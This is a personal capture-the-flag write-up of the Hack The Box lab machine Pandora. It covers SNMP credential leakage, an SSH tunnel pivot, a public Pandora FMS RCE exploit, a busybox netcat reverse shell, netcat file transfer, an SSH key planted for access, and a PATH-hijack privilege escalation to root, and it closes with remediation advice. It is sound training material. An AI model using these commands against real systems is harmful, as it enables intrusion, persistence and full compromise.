+++
date = '2026-06-11T01:44:52-04:00'
title = 'Pandora'
tags = ["htb", "easy", "repeat","SNMP","pivot internally"]
+++

![](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/6ac0e76002774bbfac92b0dbc86cb6af.png)

https://www.hackthebox.com/machines/Pandora
## OS: Linux
``` IP
10.129.14.224
```
## Credentials:

| Username | Password         | Notes/Hash        |
| -------- | ---------------- | ----------------- |
| `daniel` | `HotelBabylon23` | found from `SNMP` |

---
## `nmap` results:
```
# Nmap 7.99 scan initiated Wed Jun 10 23:15:26 2026 as: /usr/lib/nmap/nmap -p- --open -sC -sV -A -vv -oA nmap/Pandora 10.129.14.224
Nmap scan report for 10.129.14.224
Host is up, received reset ttl 63 (0.015s latency).
Scanned at 2026-06-10 23:15:27 EDT for 21s
Not shown: 64902 closed tcp ports (reset), 631 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
```
 
---
## Attack + Enum Vectors
- TCP 80: HTTP Apache httpd 2.4.41
- TCP 22: SSH OpenSSH 8.2p1
### UDP (161 SNMP)?
- UDP 161: SNMP SNMPv1 server

---
## Service Enum Notes:
### SNMP
Let's first enumerate `SNMP`
```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP
```
yields:
```
10.129.14.224 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
10.129.14.224 [public] Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
```
now let's enumerate information with `snmwalk`:
```
snmpwalk -v 1 -c public $IP
```
has too many results, let's use `snmp-extend`:
```
snmpwalk -v 1 -c public $IP ET-SNMP-EXTEND-MIB::nsExtendOutputFull
```
nothing too interesting:
```
snmpwalk -v 1 -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects
```
nothing as well, I also don't want to go over 20 million lines of input right now, I will come back to the long SNMP results later if stuck.
### Web Service: `Gobuster` / `fuff`
visiting the website:
```
http://10.129.14.224
```
we see hints of `panda.htb`, let's add that to our `/etc/hosts` real quick:
```
echo 10.129.14.224 panda.htb >> /etc/hosts
```
okay now let's see if we can find any subdomains:
```
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.panda.htb" -u http://panda.htb -fs 33560
```
yields nothing, possibly a rabbit hole then, let's brute force directories:

first `index.html` reveals that the web server uses `.html`
```
obuster dir -u http://panda.htb/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100 -r -x pdf,zip,bak,txt,html
```
yields:
```
index.html           (Status: 200) [Size: 33560]
assets               (Status: 200) [Size: 1688]
server-status        (Status: 403) [Size: 274]
```
so nothing too interesting

---
## Initial Foothold
Let's go back to `SNMP` enumeration:
```
snmpwalk -v 1 -c public $IP > snmp.out
```
and so let's `grep` some strings to analyze:
```
cat snmp.out | grep -i "STRING"
```
there are some `HEX` strings, let's `grep` out those:
```
cat snmp.out | grep -i "STRING" | grep -iv "HEX"
```
*Note: `-v` inverts select, so greps `out` the `Hex`s*

After some analysis I found a text including:
```
iso.3.6.1.2.1.25.4.2.1.5.1118 = STRING: "-u daniel -p HotelBabylon23"
```
and so let's try this with SSH
```
daniel:HotelBabylon23
```
```
ssh daniel@panda.htb
```
and enter password: we got in as `daniel`!

---
## Priv Esc
```
find / -perm -u=s -type f 2>/dev/null
```
we see an SUID bit set program that's unique:
```
/usr/bin/pandora_backup
```
but doesn't seem like we can execute it:
```
ls -lah /usr/bin/pandora_backup
```
```
-rwsr-x--- 1 root matt 17K Dec  3  2021 /usr/bin/pandora_backup
```
so I guess we need to pivot to matt? Spraying `HotelBabylon23` as `matt` password didn't get us in. 

Then I found a `/var/www/pandora` directory:
```
grep -ri "user="
```
found user `admin`: and then 
```
grep -ri "user=admin"
```
shows `admin:pandora`, spraying any of these on `matt` didn't escalate our access. We also found that there is a `/var/www/pandora/pandora_console/include/config.php` directory which we can't read but possibly containing password to database

There is a `config.inc.php` in `/include` but shows `pandora:pandora` and didn't really work to get into `mysql` or anything

I got quite stuck here: and checked [0xdf](https://0xdf.gitlab.io/2022/05/21/htb-pandora.html#shell-as-daniel) writeup for a hint: let's check `/etc/apache2/sites-enabled`. I assumed I had to trigger `pandora` on `HTTP` or maybe it was bugged, but I forgot to check `sites-enabled` for `apache`:
```
cat /etc/apache2/sites-enabled/pandora.conf
```
showed:
```
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```
I tried using `chisel` but my `chisel` version still didn't work again: this time I wanted to learn a new way to `pivot` with `ssh` which I knew before but never really used, with the help of [0xdf](https://0xdf.gitlab.io/2022/05/21/htb-pandora.html#shell-as-daniel) writeup I learned how to pivot internally with `ssh`:
```
ssh -L [binding port]:localhost:[target port] user@$IP
```
so in this case:
```
ssh -L 9999:localhost:80 daniel@$IP
```
and we successfully set up pivot, navigating to:
```
http://localhost:9999/pandora_console/
```
we finally see our version:
```
v7.0NG.742_FIX_PERL2020
```
searching that up:
```
v7.0 pandora fms exploit site:github.com
```
I found an unauthenticated RCE compared to authenticated RCEs:
```
https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated
```
and I can just:
```
python3 sqlpwn.py -t localhost:9999
```
there we go! We got a shell as Matt! But let's get a better shell:
```
sudo nc -lvnp
```
and execute with `busybox`:
```
busybox nc 10.10.15.101 1337 -e bash
```

Now let's stabilize it:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
export TERM=xterm
```
`Ctrl + Z`
```
stty raw -echo;fg
```
```
reset
```
enter my terminal size:
```
stty rows 48 cols 210
```
we got a fully functioning shell as matt!

Remeber `/usr/bin/pandora_backup`? Let's enumerate that now finally we are `matt`: let's do an analysis on what it does:
```
sudo nc -lvnp 1337 > pandora_backup
```
then:
```
nc HTB_VPN_IP 1337 < /usr/bin/pandora_backup
```
Now if we do:
```
strings pandora_backup
```
we can see it does:
```
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```
and we can see `tar` does not have `absolute` path: so we can hijack it; `tar`:
```
#!/bin/bash
chmod +s /bin/bash
```
then let:
```
PATH=.:$PATH
```
and execute:
```
pandora_backup
```
which didn't work...?

I thought my understanding of linux went wrong, but turns out [0xdf](https://0xdf.gitlab.io/2022/05/21/htb-pandora.html#beyond-root) explains this very well how why even my upgraded shell wasn't able to execute SUID programs as the way as I thought it is. Essentially because our shell was executed as Apache process, we don't have the full abilities to run SUID programs. Therefore, what I ended up doing was creating a `ssh` key like he did too: first on kali:
```
ssh-keygen -t rsa
```
`enter` -> `enter` -> `enter` for defaults: then
```
cat id_rsa.pub
```
save the output, and on target:
```
mkdir /home/matt/.ssh
```
```
echo "id_rsa.pub" >> /home/matt/.ssh/authorized_keys
```
and now let's go on `matt`:
```
ssh matt@panda.htb
```
and now:
```
pandora_backup
```
we got SUID bash:
```
bash -p
```
we got root shell

Therefore pwn'd.

---
## Conclusion & Remediation
The initial foothold on this box was actually very easy, but the privilege escalation part including the pivoting part of the box requires some logical thinking and enumeration. This box strengthened my enumeration methodologies even further and enhanced my linux understanding. Even though I've hit my rocks and was struggling but got some really good notes and understanding down.

To remediate for similar attacks from this lab: SNMP should not leak any important information such as credentials of users. In addition, web services should be up to date even if they are running locally on the machine. Last but not least, alwasy remember to use absolute path when building SUID programs to neglect the `PATH` hijacking vulnerability.